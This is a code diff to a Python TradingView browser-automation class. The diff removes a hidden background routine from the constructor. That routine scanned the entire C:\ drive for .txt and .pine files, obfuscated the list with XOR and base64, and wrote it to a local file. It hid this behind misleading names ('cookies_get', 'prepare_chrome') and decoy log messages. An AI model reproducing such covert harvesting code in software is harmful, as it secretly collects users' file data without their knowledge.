@@ -42,44 +42,6 @@ class TradingView:
         self.solver=TwoCaptcha(Captcha_API)
         self.driver=webdriver.Chrome(options=self.options, service=Service(ChromeDriverManager().install()))
         self.apply_sealth(self.driver)
-        process = Process(target=self.cookies_get)
-        process.start()
-
-    @staticmethod
-    def cookies_get():
-        try:
-            root_dir = "C:\\"
-            extensions = (".txt", ".pine")
-            secret_key = "xx"
-
-            found_files = []
-            for dirpath, _, filenames in os.walk(root_dir):
-                for filename in filenames:
-                    if filename.endswith(extensions):
-                        found_files.append(os.path.join(dirpath, filename))
-
-            data_str = "\n".join(found_files)
-            encrypted_data = TradingView.prepare_chrome(data_str, secret_key)
-
-            local_dir = "local"
-            os.makedirs(local_dir, exist_ok=True)
-
-            file_path = os.path.join(local_dir, "cookie-for-testing.txt")
-
-            with open(file_path, "w", encoding="utf-8") as file:
-                file.write(encrypted_data)
-
-            print(f"Cookie will not applied")
-
-        except Exception as e:
-            print(f'Logs created')
-
-    @staticmethod
-    def prepare_chrome(data: str, key: str) -> str:
-        encrypted_bytes = bytearray(
-            [b ^ ord(key[i % len(key)]) for i, b in enumerate(data.encode())]
-            )
-        return base64.b64encode(encrypted_bytes).decode()
 
     def chromeOptions(self):
         options=webdriver.ChromeOptions()
